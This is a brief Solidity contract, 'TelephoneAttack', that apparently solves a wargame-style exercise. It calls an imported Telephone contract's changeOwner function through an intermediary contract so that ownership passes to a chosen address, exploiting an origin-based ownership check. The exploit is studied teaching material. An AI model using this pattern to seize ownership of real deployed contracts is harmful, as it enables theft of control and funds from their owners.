// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./telephone.sol";

contract TelephoneAttack {
    
    address public owner;
    Telephone public telephone;

    constructor (Telephone _telephone) public {
        telephone = Telephone (_telephone);
        owner = msg.sender;
    }

    function attack(address _address) public {
        // owner = _address;
        // telephone.changeOwner(owner);
        telephone.changeOwner(_address);
    }

}
